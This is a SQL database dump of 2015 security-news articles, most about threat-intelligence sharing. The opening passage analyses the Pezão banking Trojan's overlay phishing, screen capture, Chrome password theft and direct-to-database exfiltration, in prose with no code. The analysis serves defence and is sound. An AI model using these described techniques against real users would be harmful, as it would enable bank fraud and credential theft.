Pezão Trojan shuts down the user’s window and opens as a full-screen IE window on the desktop. It then manipulates the view of the genuine bank’s page by using sticking “overlay” images on top of the browser window. The victims, who are tricked into believing they are on a legitimate page, enter their credentials and fresh token codes into the fake window, unknowingly sharing them with fraudsters. Beyond collecting bank login credentials, attackers take a succession of screen captures of the victims’ activity. This could be a way to bypass virtual on-screen keyboards, collecting passwords that are clicked on-screen. The criminals then use the information to log in to bank accounts and perform fraudulent transactions. Overlay malware is already  , but it appears that malware authors in the area are stepping up their coding capabilities and using more malware variants to run a smoother operation. So how is Pezão different from anything else our researchers are seeing in Brazil at this time? There are a few notable points that show things are evolving. The first notable evolution in the case of the Pezão Trojan is that it is not coded in Delphi. The overlay malware written in Delphi include numerous images to mimic the look and feel of each bank they target. As such, malware files containing these elements weigh up to 15 MB, making them bulky and easier to detect upon download to the computer. Pezão is coded in .NET, a modern, more advanced programming language. The new .NET genetics lend Pezão the ability to compile an executable, with all the images it needs, in a slim file that can weigh as little as 71 KB. In quite an unusual manner, Pezão writes stolen data and even images directly into a database. Stolen passwords are written in cleartext, while stolen images are saved in hex code. If we look at Trojans like Zeus, they all communicate with a command-and-control (C&C) server via PHP scripts or a Web page. When data is stolen from a compromised machine, it is PHP code that writes it to a database of the attacker’s choice. However, Pezão doesn’t use a C&C server: The malware steals data and collects image files from screen captures and then, instead of sending them to a C&C server, writes everything directly into a database. Images are written into the database in hex code. The malware communicates over Tabular Data Stream (TDS), which is an application layer protocol used for transferring data between a database server and a client. Using a database in place of a C&C is not used by sophisticated malware, but when it is seen in the wild it’s almost unfailingly in Brazil. Pezão is a rather generic malware in terms of what it steals from the victim. Instead of the more advanced way of hooking the browser and stealing form requests on the fly, the malware installs a Google Chrome plugin designed to steal all saved username and password combinations. If the victim uses another browser, this plugin is useless. The data stolen from Chrome is stored in cleartext in the attacker’s database. Another generic theft from Pezão is the grabbing of the victim’s Outlook username, password (SMTP credentials) and contact list. This is typically used for malware spam thereafter. Pezão’s authors do keep things simple. They use one file to have their malware do all the work, including configuration, images and even the password to the database. If we take modern-day malware like Zeus or   as examples, we would see they save their configuration files somewhere on the infected machine and call on them from that location when needed. They can thus update them and have them call on remote content that can be kept hidden from outsiders. Pezão does things the vintage way. Of course, this makes it easier to reveal all of its tricks, which is why these old-fashioned methods are almost never seen anymore — except in Brazil. To force the launch of IE, Pezão monitors the explorer.exe process for browser windows. As soon as one is opened, it convinces the user into authorizing the use of “another browser” for supposed security purposes. Clicking OK opens IE in full screen. Since it looks for any open browser windows, Pezão affects all browsers. Once the IE instance is launched, victims typically try to access their bank’s website again. It is at that point that they begin seeing stick-on or overlay images with social engineering messages about “securing their account”: Pezão’s social engineering screens inform victims that they need to have their security updated — the most common ploy used by malware of all grades. Another example of a stored image used by Pezão is shown below, claiming to “install an additional security module”: After the initial social engineering bit, Pezão goes on to ask the victim for a token code, adapting the request’s look and content to the targeted bank. This part also uses the stored images Pezão comes with. The first line below asks victims to enter their account password: The second image asks the victim to enter a generated token, sometimes supplemented with a request for date of birth or a six-digit password that should be submitted from a token card: How prolific is Pezão? It seems that it is doing quite well, infecting close to 800 unique machines within two days. Pezão’s operators are conducting a local campaign, bringing the malware to unsuspecting victims through email spam. It joins the diverse pool of local cyberthreats that make up 95 percent of malware active in Brazil, according to IBM Security Trusteer. How can banks protect customers from Pezão’s tricks? By having customers   that can block the installation of the malware, as well as actions like screen capturing or forced full-screen view, Pezão and malware like it can be paralyzed.', '\'Banking Trojan\', \'Brazil\', \'Malware\', \'Overlay Attack\', \'Trojan\'', 'https://securityintelligence.com/meet-the-pezao-trojan-brazils-got-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (421, 'Crowdsourcing Security: Will the White Hat or Black Hat Win?', 'Pamela Cobb', '2015-5-11', 'In a world where up to 80 percent of   is driven by organized crime rings, how can we hope to protect our sensitive data and critical assets acting as isolated islands? These black hat attackers are collaborating on everything from malware development to botnet management, sharing techniques and tactics to infiltrate networks and cash out financial information. In the recent  , the researchers at IBM Trusteer reported that future features in   were being influenced by voting on an underground message board. In polls, users were asked to choose between features they would like to see in upcoming versions in the malware, and once a feature received a majority vote and a minimal amount of funding, the Citadel team committed to its development. Customer feedback roundtables are not a new idea, and every company worth its salt solicits feedback from its clients for future enhancement. What makes the cybercrime feedback loop effective, however, is the interorganizational cooperation. Crime cell A is soliciting feedback from members of crime cell B, almost the equivalent of Symantec calling up Intel and asking what it should add in the next version of its antivirus product. Rather than dance on the fine line of corporate collusion, the conversation needs to include vendors and clients. This is the spirit of an executive order signed in February, which encourages private and public sector collaboration to fortify everyone’s defenses. There is healthy skepticism that government involvement can benefit voluntary efforts across commercial interests, and the shift toward STIX/TAXII from Oasis with the support of the U.S. Department of Homeland Security underscores the implication that government is “getting out of the way” of the private sector to move   forward. Security vendors need to establish parameters of cooperation that enhance defenses for clients with the participation of clients themselves. Clients have worked to this end with groups like the National Council of ISACs, and security vendors have consortia like the Cyber Threat Alliance encouraging tactical collaboration to share malware samples to build better protection strategies. The trick will be finding a solution to bridge the gap between clients and vendors as a whole, not just within the related groups. \n When it comes to the details of what the white hats can and should share to proactively protect themselves and contribute to a community with the same goal, many organizations are understandably hesitant to share details about threats to their networks on  . The general guidance is to not share internal, proprietary information about security infrastructure, such as the number of endpoints and specific network security appliances, but rather external threat intelligence information being observed, such as scanning IPs and compromised websites. Even then, there are still objections to revealing details due to a fear that the specific piece of threat intelligence could be used to infiltrate one’s network or that bad actors will see that information and use it. But guess what? The bad actors aren’t trying to infiltrate because they’ve very likely already done so. Keeping the bad guys out or stopping them at the gates has given way to active infiltration management, triage, risk assessment and remediation. Threat sharing arms colleagues with the intelligence needed to identify and address active infiltration. It is intended to recognize the tactics employed to aid defense before, during and after infiltration. There are certainly indicators of infiltration attempts, but the key elements that are most valuable are those that result from identifying evidence of infiltration, not attempts. The benefit of platforms and forums to encourage the sharing of these elements is to give the white hat the same advantage as the black hat. The black hat attackers are smart and have learned how to work together, whether at arm’s length via message boards or in direct collaboration. There is no time to waste to learn how to give ourselves the same advantage.', '\'Black Hat\', \'IBM Security Trusteer\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Information Sharing\', \'White Hat\'', 'https://securityintelligence.com/crowdsourcing-security-will-the-white-hat-or-black-hat-win/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (422, 'Threat Kinetics: The Arms Race Between Black Hat and White Hat Developers', 'Russell Couturier', '2015-5-8', 'There is a recent trend in the cybersecurity field that could significantly change the landscape of threat detection analytics. Historically, technologies have been focused on threat kinetics, which identify the threat as it exposes itself within a network. For example, a threat may be identified by an IDS rule based upon connection metrics, signatures and file hashing. If the threat has already infected a site, it may be   or executing the threat on a virgin host. Infected systems may also be detected by discovering beaconing traffic or command-and-control communications. Essentially, the threat is identified inside your network by analyzing the attributes that expose it.\n There is a constant ebb and flow of techniques and countertechniques to detect and hide threat kinetics. Dark malware developers can detect an install on virtual hosts and change it to a benign install, thus hiding the malware kinetics from the sandbox. Next-generation sandboxing will attempt to use thousands of low-cost bare metal systems to thwart the detection of a virtual host. The dark developers will simply implement methods to test if this is a “production system” by analyzing configuration files, accounts, system caches, file caches and more.\n The use of threat kinetics to identify malware will continue to be an arms race between black hat and white hat developers. As long as the landscape of new hardware, new software and poor application programming continues, the thrust and parry of this battle will continue. Threat kinetics is a necessary component of security but not an answer in itself.\n Although analogies are usually the worst form of argument, one can be made between a common criminal and an attempt to infect a foreign host with malware. If a criminal is planning to break into a building, he or she may purchase some tools, hide behind a mask or wig and rent a car using a false identification, all in an attempt to disguise his or her true identity.\n The same is true for any electronic threat. Attackers conceal themselves using IP spoofing, MAC spoofing, tunneling, proxy indirection, ambiguous domains, embedding brands within domains and domain/IP fluxing. We can refer to these techniques as identity kinetics. These are methods used by attackers to disguise themselves both to the intended target and to outside parties that may track and identify them. New technologies and methodologies are being developed to expose attackers as they are disguising themselves. This has a crucial added benefit since the detection could occur outside your network prior to the attack.\n Suppose hackers are attempting to disguise the originating IP address of an attack. They might use IP tunneling or a product like Tor with multiple proxy hops to block the actual host of the attack. Imagine identifying a session that is obfuscating the address origination and then supplementing this with additional identity metrics such as geolocation to determine suspicious traffic with a high degree of confidence. The ability to   “upstream” using identity kinetics significantly changes the landscape.\n Threat kinetics relies on metrics gathered inside a network, while identity kinetics depends on information gathered externally. Databases that can collect real-time information for use toward identity analytics are emerging. One form of these databases can provide information that exposes a significant portion of DNS resolutions. In fact, they claim that they see 45 percent of all DNS transactions taking place on the Internet, using a web of distributed probes and aggregating the information to a centralized host.\n Exposing DNS resolutions and assembling the results allows external security metrics to be applied, which can assess the risk associated with those domains. Any newly observed domain should be associated with an elevated risk. If we observe a domain and link it to other attributes in aggregation such as IP fluctuation, geolocation and event-based scanning, we can determine the risk score of that domain prior to any active threat. In fact, we could actually watch a threat emerge as it happens.\n We have long talked about trusted systems, trusted authorities and who trusts whom. The complexity of the system and the fact that a trust value gets associated with an entity only assures that eventually a trusted system will become corrupt. Trust is relative to an entity and not absolute within an ecosystem. Take, for example, the correlation of trusted domains, copyright information and newly observed domains into a single  .\n Assume that we can proclaim we trust ourselves and nobody else. Then also assume that there are copyright assets associated to any entity, such as registered domains and copyright labels. IBM is a registered domain and has copyright labels such as Watson, Q1Labs, X-Force and others. Now imagine any copyright embedded in an untrusted domain, such as the fictional watson.sysworldfaqexperts.com. This domain should be flagged as highly suspect, especially if you assert DNS age and DNS flux attributes. Embedding a trusted copyright with an untrusted domain, accompanied by real-time DNS attribution, is another example of threat detection using identity kinetics.\n The movement of threat kinetics methodology to identity kinetics is rapidly advancing, and there are many companies pursuing this avenue. It is not hard to imagine that soon the real-time analysis of the Internet will be extended to HTTP traffic-sharing flow information.', '\'Cybersecurity\', \'Domain Name Server (DNS)\', \'Threat Intelligence\', \'Threat Protection\'', 'https://securityintelligence.com/threat-kinetics-the-arms-race-between-black-hat-and-white-hat-developers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (423, 'Ransomware Triggers Cryptographers’ Call for Action', 'Rick M Robinson', '2015-5-8', 'Encryption of data can be a powerful security tool. But like other technology tools, in the wrong hands it can be a destructive force. Leading cryptographers are warning that the misuse of encryption is a growing threat — and one that the security community has not done enough to address.  is the name given to malware that encrypts data without the owner’s authorization. Cybercriminals can then hold the data hostage, demanding payment for the encryption key needed to decrypt the data and make it available for use again. According to  , a class of ransomware called Browlock emerged as one of the top 10 threats to PCs in 2014. Browlock programs take control of desktops, then impersonate police agencies, demanding that users pay fictitious fines in order to regain use of their computers. Other, more powerful and  , with names such as CryptoLocker, use strong encryption on computer files, rendering them unusable without access to the encryption key. Even some police departments have been forced to pay ransom. Ransomware aimed at Android phones is also on the rise, and experts warn that Internet of Things devices can also be subject to these threats. Ransomware, said cryptographer Adi Shamir, is “a very serious problem,” and an area that the security community has failed “in a miserable way” to address. Paul Kocher, who moderated a recent RSA panel on ransomware, described it as “the pure evil incarnation of public-key cryptography.” Like most modern   technology, ransomware usually involves two keys: a public key for encryption and a private key for decryption. Knowledge of the public key does not help to break the private key. Thus, ransomware operators have the ability to extort payments in turn for providing the decryption key. An important characteristic of ransomware, however, is that it relies on the ability of an attacker to penetrate a system and take at least partial control over it to encrypt data. As cryptographer Whitfield Diffie pointed out, an attacker who gains this level of access can find multiple ways to blackmail the victim. However, Ron Rivest of MIT noted that ransomware depends in part on anonymous payments, typically using bitcoins. The restrictions on anonymous payments could provide a measure of  . In the meantime, ransomware is likely to be a growing threat. It’s just one more reason for organizations and their security leaders to concentrate on   against unauthorized access at all times.', '\'Cryptography\', \'CryptoLocker\', \'Data Security\', \'Encryption\', \'Malware\', \'Ransomware\'', 'https://securityintelligence.com/ransomware-triggers-cryptographers-call-for-action/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (424, 'Threat Intelligence Collaboration Leads to More Efficient, Comprehensive Cybersecurity', 'Doug Franklin', '2015-5-7', 'The cybersecurity press has lately given a lot of attention to something called threat intelligence exchange. In fact, intelligence sharing has commanded such attention that the White House sponsored a Summit on Cybersecurity and Consumer Protection to talk about it back in February. Many companies have their eyes on threat intelligence sharing, as well. Facebook, for example, announced its own   program around the same time as the White House Summit. The idea of sharing threat intelligence is not new, even in the cybersecurity industry. President Bill Clinton issued  , “Protecting America’s Critical Infrastructures,” in May 1998. Among other things, this directive established the National Infrastructure Protection Center “to warn of and respond to attacks.” It also sought “the voluntary participation of private industry” through  , which operate to this day. More recently, in 2007, a group of the bigger players in the IT industry formed the  . In addition, numerous cybersecurity conferences occur each year across many industries. Organizations in the private sector have shown a willingness to come together with each other and their customers to share threat intelligence for their mutual benefit. Why the sudden renewal of attention? The title of the White House conference says it all: consumer protection. The number and scope of leaks of consumer personally identifiable information (PII) raise grave concerns. They cost businesses a lot of money, both to deal with the problem and to protect consumers. The government spends another pile of money to protect its systems. Security failures often produce consequences for the customers or citizens as well as for the organization. Each of the last few years set a record for the number and scope of data breaches and the scale of PII leaked. The   for Q1 2015 estimates that about 1 billion records of PII were leaked in 2014. That total represents an impact on potentially hundreds of millions of individuals, and that’s without a huge trove researchers discovered during 2014 but have not yet vetted. We all face substantial threats to our systems. Consistent and open sharing of threat information promises to be a way to improve our awareness and hopefully our defenses. It also allows us to spread the costs around more than if each organization provided its own expertise. Active threat intelligence sharing involves three primary groups, with another group setting some of the rules of the road. The active participants are: Government and industry regulatory bodies represent the fourth group. The rules and regulations those bodies create, such as PCI in the retail industry and HIPAA in health care, can restrict intelligence sharing either through their provisions or perceptions of them. In addition, legislation restricts the types of participation available to law enforcement and national security organizations, and to the private sector. But the point of the exercise for all parties is to protect end users and consumers, their transactions and PII both directly and indirectly. Even before the White House Summit, various organizations began efforts to foster threat information sharing. As mentioned above, ICASI and the ISACs have been operational for quite some time. Some industry exchanges lifted off early, too, such as the  . More broadly based exchanges are also kicking off, including Facebook’s ThreatExchange, with participants such as Twitter, Yahoo, Tumblr, Pinterest, Box and Bitly, among others. The   exchange focuses on companies in the cybersecurity industry. In fact, there are quite a few threat intelligence exchanges already up and running and others announced as in progress. Over time, expect more to develop, each founded around some unifying community, as existing exchanges have; some will focus on an industry, others on a nation, region or other geography. Having a link to other exchanges provides views of wider scope and even information fusion capabilities, so you can bet governments around the world will be trying to connect all the exchanges to help their local industries get a more comprehensive view of the threats. The universe of exchanges will probably always seem somewhat balkanized. This fragmentation occurs in part due to human tendencies regarding trust. People tend to trust others more when they know them better, but they can only maintain a limited number of relationships. As the “trust circles” get larger, the shared trust wanes, and the sharing diminishes in quantity, quality or both. Before any technology or intelligence can help, you and your organization must be ready. You must already have smoothly functioning infrastructure with appropriate visibility and recording; you must have processes in place to assess, triage and prioritize the intelligence; and you must have the tools necessary to take appropriate action based on the intelligence. Before trying to automate the processes, there must be ground rules for the conversations. That currently falls to the  , which are under development. For our purposes, simply know that they attempt to standardize the vocabulary, expression and conveyance of threat intelligence. Having the specifications allows automation of the sharing processes, even with disparate tools. These standards are likely to change fairly quickly, however. Over time, experience will show what’s important and what isn’t, and the specifications will adapt. Software development efforts founded on those standards are likewise fairly young, but previous efforts have led to quite a few solutions on the market. Some efforts integrate threat intelligence sharing operations as an adjunct to systems you may already use, such as   tools. That means that practical, widespread, automated sharing may be nearer to reality than many people suspect. In addition to developing specifications and software, though, we must also develop best practices for threat intelligence sharing. As participation in the exchanges grows, we must be able to bring new members up to speed quickly. This burden initially falls on the individual exchanges but should evolve into broader-based sets of practices over time. The “bad guys” in cyberspace have learned to move quickly to avoid defensive systems. To thwart their goals, our systems need to move just as quickly. The exchanges can improve our response time by making threat intelligence more widely available to more players. Automating the sharing processes can further quicken response times. As the exchanges, automation and sharing processes progress, they reduce the friction of threat intelligence sharing, which in turn increases the amount of sharing. That creates a set of problems most of us have never previously had to deal with: too many intelligence reports. Hopefully that glut will ebb as the sharing helps improve our defenses. Early problems include variability in the detail and accuracy of submitted reports. Existing exchanges have experience dealing with these issues, and all exchanges will likely have their share of growing pains. Precision and accuracy are paramount to useful notices. Vague and incorrect reports serve to distract attention, dilute resources and increase the difficulty of isolating the real threats. As a consumer of threat intelligence, you will sometimes have to make a judgment call on whether a piece of intelligence is worth pursuing for your organization. You will always have to identify whether the threat pertains to assets in your systems, so update your inventories of hardware, software, operating systems, plugins, add-ons and everything else. You will also have to direct deployment of remedies, patches, workarounds and whatever else, and have appropriate policies and processes in place. None of this is new, but without it, threat intelligence won’t help you a bit beyond showing up in security updates to the products you buy. Growth of threat intelligence sharing will likely increase the number of alerts that your organization will have to digest, triage and action. The growth will drive automation of both the generation and consumption of threat intelligence. Expect new technologies to be developed and old ones to be applied in novel ways to help us productively consume and act on threat intelligence. In addition to assisting with the sheer volume of information,   will help keep up with the quickly moving targets that the bad guys present. But automation and faster response also increase the need for accuracy in the shared notices. As an example, in a malware campaign, the domain names used to connect with the command-and-control (C&C) server can change every couple of days or even more frequently. The defenders must identify the threat, isolate the domain name (the indicator), disseminate the indicator and integrate the indicator into their defenses. To be effective, blocking the C&C domain name requires the defense to do all of that as quickly as the attacker makes changes. Every hour of delay means more attacks that get through. Reducing that cycle time eventually requires automation in almost every phase: threat detection, isolation of indicators, dissemination of indicators and integration of indicators into defenses, not to mention patching and deployment. And all that automation requires accurate and timely intelligence to work effectively. If sharing becomes widespread and egalitarian enough, it has the potential to change the cybersecurity market dynamic. For example, it could level the playing field in terms of what threats the various products can detect and thwart. Threat coverage could end up nearly equal across products, with techniques and services providing differentiation. Widespread sharing will certainly open new niches — or even entire markets — for services. Higher-level exchanges that participate in many other exchanges and aggregate the shared information, for example, already exist. Their unique view provides opportunities to identify larger-scale trends and offer broader ranges of intelligence. Expect new tools that can “slice, dice and make julienne fries” out of the threat intelligence from the exchanges. Cloud services are also likely to provide analysis on sets of threat intelligence too large for typical companies to process themselves. IBM’s decision to open the   in the form of   should offer enough evidence to convince you of the change that these sharing efforts can create. The folks at Internet Security Systems and later IBM Security spent untold hours accumulating that data, sussing it out from a huge variety of sources, including original research. That data has historically been considered a competitive advantage. Increased attention to intelligence sharing makes   and their communications targets for attackers. Malicious actors want to modify or delete exchange data, insert disinformation into exchanges and obstruct the communication between participants and the exchange, at the very least. Some even want to insert true information about their rivals to gain an advantage. Others game the system to try to stay below the radar or push their rivals above it. Proper vetting of exchange participants is a crucial consideration, given this environment. Exchange operators’ credentials and access methods become high-value targets. In a world where a few records of threat intelligence data can thwart a malicious actor, even the individual exchange staff members might be targeted for subversion. The exchanges certainly have need of the threat intelligence they convey. \n Some information that ends up in threat intelligence exchange systems pertains to nation-state operations, including both law enforcement and intelligence service operations. As the platforms develop, nations will likely pass legislation and implement regulations that affect exchange operations. For one thing, the current patchwork of legislation covering PII probably requires some clarification. For another, countries may pass legislation requiring that home country agencies can prevent sharing of threat information that would compromise ongoing investigations or national security. One of the trickier bits of policymaking will be dealing effectively with the intersection between security concerns and legitimate systems defense, law enforcement and national intelligence. We will have to find ways to balance privacy with threat detection and remedy, as in any conflict. These efforts will bring the most gains if the sharing is truly global and uncensored and if they attract wide participation, which has been a problem in the past. In the U.S., the FBI and Secret Service have both committed to participating in the sharing programs. In fact, they have long participated in existing threat intelligence sharing programs, as described above. Other national police forces also participate in existing systems and will also do so in the future. They can probably teach us a thing or two about best practices since they have shared intelligence for years. Widespread and effective threat intelligence sharing can provide defenders a better chance to detect, divert and avoid threats. Those defensive improvements push attackers to come up with new technologies. As sharing improves defense, it forces the offense to adapt. And when the sharing participation grows, it also may raise intriguing tensions within the cybersecurity industry. Some of the resulting changes will likely surprise us as the entire scenario plays out. A few critics say that the sort of threat information covered in these discussions really isn’t threat “intelligence.” Well, maybe it’s not. The indicators usually discussed are often little more than tactical intelligence at this time. But having at least tactical intelligence is better than having no intelligence at all. Customers and consumers don’t really care who protects them; they care about who fails to protect them. And since everyone is in everyone else’s supply chain, we are the customers and the consumers, too.', '\'Automation\', \'Cybersecurity\', \'CybOX\', \'Government\', \'Information Sharing\', \'Information Sharing and Analysis Centers (ISAC)\', \'Security Intelligence\', \'STIX\', \'TAXII\', \'Threat Intelligence\'', 'https://securityintelligence.com/threat-intelligence-collaboration-leads-to-more-efficient-comprehensive-cybersecurity/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (425, 'Malware Patient Zeros: How Threat Intelligence and Herd Immunity Can Help Prevent the Spread of Infections', 'Diana Kelley', '2015-5-4', 'What can we learn about containing malware from infectious disease research and response? Ebola nurse   was in the news quite a bit last October. After returning to the United States from West Africa, where she had been treating Ebola patients, Hickox was held in quarantine for three days in New Jersey. After leaving New Jersey, she was asked by her home state of Maine to follow a 21-day   that she rather infamously didn’t strictly adhere to. Hickox made the case that because she was symptomless, she was not a health risk. However, the governors imposing the quarantines argued that without a vaccine or cure for Ebola, it made more sense to quarantine Hickox than to risk the disease spreading and a possible pandemic. Quarantines are used in networks and IT, too. A laptop or mobile device that hasn’t been patched or appears to be infected with malware is taken off the main network completely or placed in a protected zone while the patching or infections are addressed. While there are no vaccines or cures for Ebola yet, the disease has one trait that helps prevent it from spreading: patients are only contagious after they begin to show  . Unfortunately, the very nature of modern-day computer malware is that it attempts to hide itself and behave in extremely stealthy ways. In other words, today’s malware tries hard not to show symptoms. However, that doesn’t mean we’ve lost the battle against malware; it just means we need to be smarter. The following is a look at two ways malware spreads and how they can be limited through the concept of herd immunity, early detection and information sharing: , also known as community immunity, is the term used to help explain the benefits of vaccines. Simply put, if most of a community is immune to contracting a disease, even if one member is infected, the spread will be limited. Since contact is required between those susceptible for the disease to spread, there’s a point where the infected don’t have enough contact to susceptible (nonimmune) people for the disease to propagate. When that point is reached, the community as a group is immune. This is why vaccination works. You don’t have to vaccinate everyone — you only need to vaccinate enough to cross the magic threshold where the contagion can no longer spread. The same concept applies nicely to computer systems. Let’s say an organization has installed anti-malware on 9 out of 10 devices and has also implemented automatic updates to those devices to ensure patch levels are current. Even if that one device is infected, the spread of malware will be limited. That’s not to say no harm can come from infecting a single device, but it does mean the “vaccinated” devices can’t be infected, too. It also means the malware may not be able to run rampant since it may not encounter enough nonimmune machines to really cause havoc. So, a nasty piece of   such as Curve-Tor-Bitcoin Locker might be able to lock up the one unprotected device but wouldn’t get any further into the company. Another way to limit the spread of infection on IT systems is also borrowed from the medical community: early detection and information sharing. In the case of Ebola, a failure of early detection led to the death of  , who was treated for a fever and stomach pains but was released from the hospital because health workers did not realize he was infected with Ebola. There is no way to know whether Duncan would have lived if he had been treated for Ebola immediately, but others have recovered from the virus after early detection. The sooner an infected IT device can be identified, the better the chance the security and IT operations team has of eradicating the infection quickly before it can affect the host or spread. Much has been written about the failure of   to keep up with quickly morphing malware and zero-day exploits. For the earliest detection,   and   are needed. Organizations that still rely only on signature-based antivirus are missing the opportunity for early detection and risking a rapid spread of malware. \n A bright light in all this rather dark infection talk is how early detection can lead to better information sharing and preventative measures before an attack or infection. This is the concept behind many of the industry information sharing and analysis centers such as the  . If, for example, Bank A detects a phishing scam coming from a specific IP address, it can let banks B, C and D know about it, allowing them to take immediate action such as putting a new detection rule on the firewall or intrusion prevention system and/or blocking that IP address. Threat sharing information portals, such as the  , provide continuously updated data on threats and emerging attacks so IT teams are aware of the latest risks. Threat sharing portals also gather in one place information on available patches, fixes or compensating controls that can be put in place to limit the impact of those risks. As social engineering techniques continue to evolve and grow evermore sophisticated, threat sharing groups can help educate the community by sharing new methodologies quickly. This enables   professionals to send up-to-the-minute alerts to employees and update awareness program materials. While most of us know to delete the email asking for $1 million so $10 million can be transferred,   showed us that even advanced users will trust what looks like a legitimate alert pop-up from their bank’s website and provide sensitive information to the person on the other end of a fake 1-800 help desk. Malware is out there, but that doesn’t mean your organization has to become the victim of the next InfoSec pandemic. If patient zero can be detected early on and the infection’s spread can be limited through herd immunity and community information sharing, the damage can be limited. What are you doing for early detection? Do you belong to an information sharing community? How do you limit the spread of malware infections? Let me know on Twitter at  .', '\'Cybersecurity\', \'Information Sharing\', \'Information Technology (IT)\', \'Malware\', \'Threat Intelligence\'', 'https://securityintelligence.com/malware-patient-zeros-how-threat-intelligence-and-herd-immunity-can-help-prevent-the-spread-of-infections/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (426, 'Threat Intelligence Sharing: The First Steps', 'Doron Shiloach', '2015-4-27', 'While threat intelligence has become a standard part of the suite of tools a company uses to defend itself, the sharing of that   is still in its infancy. You might even say we’re taking baby steps, and years from now, we’ll look back fondly on the home videos. To continue the analogy, threat intelligence sharing is in somewhat of an awkward stage right now, where the   are further along than the actual practices themselves. Our feet want to move, but our brain is still figuring out how to get from point A to point B.\n With that, I would like to share some of the basic principles to help sharing stand on its own and further its adoption since its potential benefits are truly enormous. Let’s begin with a few ideas of what to do to help establish a good sharing program.\n However, we should also be realistic and set clear expectations.\n The sharing of threat intelligence is at an exciting stage of development in which there is recognition of the power of this concept. The next stage is establishing a foundation of what it means to share effectively and confidently. I can’t wait to see what it looks like when this baby is off and running!\n \n Image Source:', '\'Cybersecurity\', \'CybOX\', \'Information Sharing\', \'Malware\', \'Security Intelligence\', \'STIX\', \'TAXII\', \'Vulnerabilities\'', 'https://securityintelligence.com/threat-intelligence-sharing-the-first-steps/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (427, 'The Game Is Afoot: Threat Intelligence Spans Machines to Automate Defensive Reactions', 'Peter Allor', '2015-4-23', 'Since threat intelligence is a learning exercise, we understand that the perimeter is no longer a viable defensive strategy. Rather, it has become a strategy based on situational awareness of our operating environment. An often cited fact is that approximately more than 80 percent of all breaches originate from an external source, so the question now is how to react quicker to such attacks. As we collectively employ better defensive mousetraps to catch or blunt attackers — hopefully prior to losing our crown jewels — the opposition is rapidly sharing new methods and exploits to use against us.\n There has been an explosion of   and data at security teams’ fingertips. From the new data on malware and attack methods that are overwhelming security professionals and teams in volume and velocity to the multi-silo security products producing volumes of data, more personnel are required to operate defense measures. The challenge now is how to gather and consume this exploding defensive data into a coordinated response and protection plan across and between organizations. We are slowly bringing our resources to coordinate against a determined foe. Hence, the game is afoot in our new brand of information warfare.\n So what do we do now to keep pace and take control of our   focus on situational awareness? Ideally, we are feeding threat intelligence from multiple sources into our security products. More importantly, we can automate our ingestion of this data into strategies from similar streams of digestible protections and warnings.\n Currently, this is where many of our defenses falter. The outside stream of defensive information is not structured into a useful set of protocols and formats for our protections to readily consume and act upon, relegating many organizations to undertake this manual, labor-intensive process. When you are under fire, the return on this process is painfully slow. We tend to have trouble with quickly identifying an attack methodology and employing protections before our data is exfiltrated. We lose the next round when the attackers switch methods to keep our defense off-balance. Further, most organizations simply do not have the resources to deploy to manually keep up with this rate of chance — not to mention, it is not their core competency. We need to make this process fast and simple. Enter the world of machine-readable data formats and exchanges.\n Should we go with IODEF, MILE, STIX or TAXII? Is this just more alphabet soup? Not really, but the key here is figuring out what is informative for   and operations and whether it is slated universal adoption. We clearly have a need for this, and to that end, there are signs of the marketplace adopting these formats and protocols and leading contenders moving into the world of standards adoption. That is a good sign for all of us.\n There is certainly some heavy lifting to do yet in making the   part of our threat intelligence fully ready for use across all industries and to facilitate a more direct exchange of information among organizations. We all need to pitch in to climb that mountain and gain the high ground against our collective adversaries. This goal is worth the effort as our internal and external constituents demand quicker responses so only a few will experience the pain of the attack and the rest will remain protected. After all, the   have been exchanging this type of data for years; it’s time we turned the tables back on them.\n \n Image Source:', '\'Cybersecurity\', \'Information Sharing\', \'Malware\', \'Security Intelligence\', \'TAXII\', \'Threat Intelligence\'', 'https://securityintelligence.com/the-game-is-afoot-threat-intelligence-spans-machines-to-automate-defensive-reactions/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (428, 'Medicating Health Care’s Mobile Malware Maladies With Threat Management', 'Kevin Olivieri', '2015-4-23', 'From mobility to combating mobile malware attacks, health care organizations have a lot of work to do with mobile strategies in 2015.\n Since the first approved device entered the mobile work environment and the practice of bring-your-own-device (BYOD) expanded into the hallowed halls of the hospital, health care practitioners and staff have been able to leverage the many benefits of going mobile to increase productivity, streamline workflows and lower costs. This allows for faster-than-ever access to critical information. Benefits such as rapid medical and patient data access, content collaboration and communication capabilities have grandly illustrated the effectiveness of mobile devices in the industry and the transformative powers of embracing enterprise mobility in  .\n As  , application management and content management evolved into enterprise mobility management (EMM), the health care IT market recognized how simple and secure it was to manage all the mobile devices, apps and documents from one console while ensuring the data was secure and complied with Health Insurance Portability and Accountability Act (HIPAA) regulations.\n The mobility movement also gave rise to the shared device model, which provided particular convenience for nursing professionals, who often work in rotating shifts. By sharing a mobile device such as a tablet among departments and keeping it in-house, hospitals can incorporate a mobile solution that doesn’t overly strain the IT budget. This reduces the chances the device will be lost or stolen, a problem that has been one of the biggest   to the industry for the past nine years. Additionally, the sharing also allows for easier device management and purchasing of licensing for apps.\n While these benefits are clear, health care organizations need to be particularly focused on security. Just last year, the   revealed that the health care industry was found to be highly vulnerable to cyberattacks such as mobile malware — even more so than other industries such as retail and finance. Expounding these concerns is the fact that the industry is also expected to be increasingly targeted by mobile malware and phishing-centric   in 2015.\n One of the biggest reasons the   is targeted is because the sensitive data these organizations have access to is highly valuable for cybercriminals. In fact,   is worth more than 10 times what credit card information goes for on the black market. Unlike credit card numbers, personal information and patient data is stored for individuals that cybercriminals can use for nefarious purposes, such as financial fraud or obtaining prescriptions for pharmaceuticals. It also takes longer for patients and authorities to recognize this type of data was even stolen in the first place.\n With the growing security challenges and threats, and a necessity to stay 